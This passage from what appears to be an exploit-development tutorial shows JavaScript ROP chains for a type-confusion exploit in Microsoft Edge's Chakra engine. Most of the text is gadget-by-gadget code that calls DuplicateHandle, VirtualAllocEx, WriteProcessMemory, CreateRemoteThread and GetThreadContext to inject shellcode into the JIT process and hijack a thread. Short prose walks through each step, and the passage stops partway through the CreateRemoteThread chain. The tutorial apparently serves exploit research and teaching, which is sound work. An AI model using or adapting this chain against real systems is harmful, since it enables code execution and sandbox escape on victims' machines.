// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetTwo, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// VirtualAlloc() ROP chain
// Stage 7 -> Allocate some local memory to store the CONTEXT structure from GetThreadContext

// DWORD flProtect (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // PAGE_READWRITE (0x4)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// LPVOID lpAddress (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (let VirtualAlloc() decide the address)
next();

// SIZE_T dwSize (RDX) (0x4d0 = sizeof(CONTEXT))
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x000004d0, 0x00000000);             // (0x4d0 bytes)
next();

// DWORD flAllocationType (R8) ( MEM_RESERVE | MEM_COMMIT = 0x3000)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT (0x3000)
next();

// Call KERNELBASE!VirtualAlloc
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x5ac10, kernelbaseHigh); // KERNELBASE!VirtualAlloc address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAlloc)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAlloc - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38     
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38        
next();
```

This call is pretty straight forward, and since there are only four parameters we don't have to write any parameters to the stack.

We start out with the `flProtect` parameter (again we have to make sure RAX is writable because of a gadget when performs `cmp r8d, [rax]`). We can set a breakpoint on `jmp rax`, as we have seen, to reach our first gadget within the `VirtualAlloc` ROP chain.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion149.png" alt="">

The first parameter we are going to start with `flProtect` parameter, which we will set to `4`, or `PAGE_READWRITE`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion150.png" alt="">

Our call to `VirtualAlloc` is now in this state:

```c
VirtualAlloc(
	-
	-
	-
	PAGE_READWRITE			// Make sure the page is writable so GetThreadContext can write to it
);
```

The next parameter we will address is `lpAddress` - which we will set to `NULL`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion151.png" alt="">

This brings our call to the following state:

```c
VirtualAlloc(
	NULL,				// Let the system decide where to allocate the memory
	-
	-
	PAGE_READWRITE			// Make sure the page is writable so GetThreadContext can write to it
);
```

Next up is our `dwSize` parameter. We showed earlier how to calculate the size of a `CONTEXT` structure, and so we will use a value of `0x4d0`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion152.png" alt="">

This brings us to the following state - with only one more parameter to deal with:

```c
VirtualAlloc(
	NULL,				// Let the system decide where to allocate the memory
	sizeof(CONTEXT),		// The size we want to allocate (size of a CONTEXT structure)
	-
	PAGE_READWRITE			// Make sure the page is writable so GetThreadContext can write to it
);
```

The last parameter we need to set is `flAllocationType`, which will be a value of `0x3000`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion153.png" alt="">

This completes our parameters:

```c
VirtualAlloc(
	NULL,				// Let the system decide where to allocate the memory
	sizeof(CONTEXT),		// The size we want to allocate (size of a CONTEXT structure)
	MEM_COMMIT | MEM_RESERVE,	// Make sure this memory is committed and reserved
	PAGE_READWRITE			// Make sure the page is writable so GetThreadContext can write to it
);
```

Lastly, we execute our function call and the return value should be to a block of memory which we will use in our call to `GetThreadContext`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion154.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion155.png" alt="">

As part of our next ROP chain, calling `GetThreadContext`, we will preserve this address as we need to write a value into it before we make our call to `GetThreadContext`.

`GetThreadContext` ROP Chain
---

As mentioned earlier, we want to inject one last item into the JIT process, now that our shellcode is there, and that is a final ROP chain that will mark our shellcode as RWX. As we know, with ROP, we need to have stack control in order to have ROP work, as each gadget performs a return to the stack, and we need to control what each gadget returns back into (our next ROP gadget). So, since we have already controlled a thread (by creating one) in the remote JIT process, we can use the Windows API `GetThreadContext` to dump the CPU register state of our thread, which includes the RSP register, or the stack pointer. In other words, `GetThreadContext` allows us, by nature, to leak the stack from a thread in any process which a user has access to via a handle to a thread within said process. Luckily for us, as mentioned, `CreateRemoteThread` returned a handle to us - meaning we have a handle to a thread within the JIT process that we control.

However, let's quickly look at `GetThreadContext` and its [documentation](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext), specifically the `lpContext` parameter:

> A pointer to a `CONTEXT` structure (such as `ARM64_NT_CONTEXT`) that receives the appropriate context of the specified thread. The value of the `ContextFlags` member of this structure specifies which portions of a thread's context are retrieved. The `CONTEXT` structure is highly processor specific. Refer to the `WinNT.h` header file for processor-specific definitions of this structures and any alignment requirements.

As we can see, it is a _slight_ misnomer to say that we _only_ need to supply `GetThreadContext` with an empty buffer to fill. When calling `GetThreadContext`, one needs to fill in `CONTEXT.ContextFlags` in order to tell the OS how _much_ of the thread's context (e.g. CPU register state) we would like to receive. In our case, we want to retrieve all of the registers back (a full `0x4d0` `CONTEXT` structure).

Taking a look at [ReactOS](https://doxygen.reactos.org/d0/df4/sdk_2include_2xdk_2amd64_2ke_8h.html) we can see the possible values we can supply here:

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion156.png" alt="">

If we add all of these values together to retrieve `CONTEXT_ALL`, we can see we get a value of `0x10001f`. This means that when we call `GetThreadContext`, before the call, we need to set our `CONTEXT` structure (which is really our `VirtualAlloc` allocation address) to `0x10001f` in the `ContextFlags` structure. 

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion157.png" alt="">

Looking at WinDbg, this value is located at `CONTEXT + 0x30`.

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion158.png" alt="">

This means that _before_ we call `GetThreadContext`, we need to write to our buffer, which we allocated with `VirtualAlloc` (we will pass this into `GetThreadContext` to act as our "`CONTEXT`" structure), the value `0x10001f` at an offset of `0x30` within this buffer. Here is how this looks:

```c
VirtualAlloc_buffer.ContextFlags = CONTEXT_ALL		// CONTEXT_ALL = 0x10001f

GetThreadContext(
	threadHandle,					// A handle to the thread we want to retrieve a CONTEXT structure for (our thread we created via CreateRemoteThread)
	addressof(VirtualAlloc_buffer)			// The buffer to receive the CONTEXT structure
);
```

Let's see how all of this looks via ROP (with previous chains for continuity):

```javascript
// alert() for debugging
alert("DEBUG");

// Store the value of the handle to the JIT server by way of chakra!ScriptEngine::SetJITConnectionInfo (chakra!JITManager+s_jitManager+0x8)
jitHandle = read64(chakraLo+0x74d838, chakraHigh);

// Helper function to be called after each stack write to increment offset to be written to
function next()
{
    counter+=0x8;
}

// Begin ROP chain
// Since __fastcall requires parameters 5 and so on to be at RSP+0x20, we actually have to put them at RSP+0x28
// This is because we don't push a return address on the stack, as we don't "call" our APIs, we jump into them
// Because of this we have to compensate by starting them at RSP+0x28 since we can't count on a return address to push them there for us

// DuplicateHandle() ROP chain
// Stage 1 -> Abuse PROCESS_DUP_HANDLE handle to JIT server by performing DuplicateHandle() to get a handle to the JIT server with full permissions
// ACG is disabled in the JIT process
// https://bugs.chromium.org/p/project-zero/issues/detail?id=1299

// Writing our ROP chain to the stack, stack+0x8, stack+0x10, etc. after return address overwrite to hijack control-flow transfer

// HANDLE hSourceProcessHandle (RCX) _should_ come first. However, we are configuring this parameter towards the end, as we need RCX for the lpTargetHandle parameter

// HANDLE hSourceHandle (RDX)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Pseudo-handle to current process
next();

// HANDLE hTargetProcessHandle (R8)
// (HANDLE)-1 value of current process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPHANDLE lpTargetHandle (R9)
// This needs to be a writable address where the full JIT handle will be stored
// Using .data section of chakra.dll in a part where there is no data
/*
0:053> dqs chakra+0x72E000+0x20010
00007ffc`052ae010  00000000`00000000
00007ffc`052ae018  00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hSourceProcessHandle (RCX)
// Handle to the JIT process from the content process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
next();

// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();

// VirtuaAllocEx() ROP chain
// Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

// DWORD flAllocationType (R9)
// MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
/*
0:031> ? 0x00002000 | 0x00001000 
Evaluate expression: 12288 = 00000000`00003000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// SIZE_T dwSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPVOID lpAddress (RDX)
// Let VirtualAllocEx decide where the memory will be located
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     				   // Recall RAX already has a writable pointer in it

// Call KERNELBASE!VirtualAllocEx
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain
// Stage 3 -> Write our shellcode into the JIT process

// Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)

/*
0:015> dq kernelbase+0x216000+0x4000 L2
00007fff`58cfa000  00000000`00000000 00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     // Recall RAX already has a writable pointer in it

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);      // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// LPCVOID lpBuffer (R8) (shellcode in chakra.dll .data section)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);    	  // .data section of chakra.dll holding our shellcode
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// CreateRemoteThread() ROP chain
// Stage 4 -> Create a thread within the JIT process, but create it suspended
// This will allow the thread to _not_ execute until we are ready
// LPTHREAD_START_ROUTINE can be set to anything, as CFG will check it and we will end up setting RIP directly later
// We will eventually hijack RSP of this thread with a ROP chain, and by setting RIP to a return gadget our thread, when executed, will return into our ROP chain
// We will update the thread later via another ROP chain to call SetThreadContext()

// LPTHREAD_START_ROUTINE lpStartAddress (R9)
// This can be any random data, since it will never be executed
